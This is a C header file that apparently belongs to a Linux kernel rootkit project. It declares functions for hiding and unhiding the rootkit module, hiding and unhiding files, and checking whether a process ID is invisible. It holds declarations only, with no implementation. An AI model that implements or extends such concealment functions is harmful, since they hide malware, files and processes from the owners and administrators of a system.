/*
 * Author: Daniel Liscinsky
 */


#ifndef KERN_ROOTKIT_ACTIONS_H
#define KERN_ROOTKIT_ACTIONS_H



int is_pid_invisible(pid_t pid);


void unhide_module(void);
void hide_module(void);

int unhide_file(const char *filepath);
int hide_file(const char *filepath);


#endif //KERN_ROOTKIT_ACTIONS_H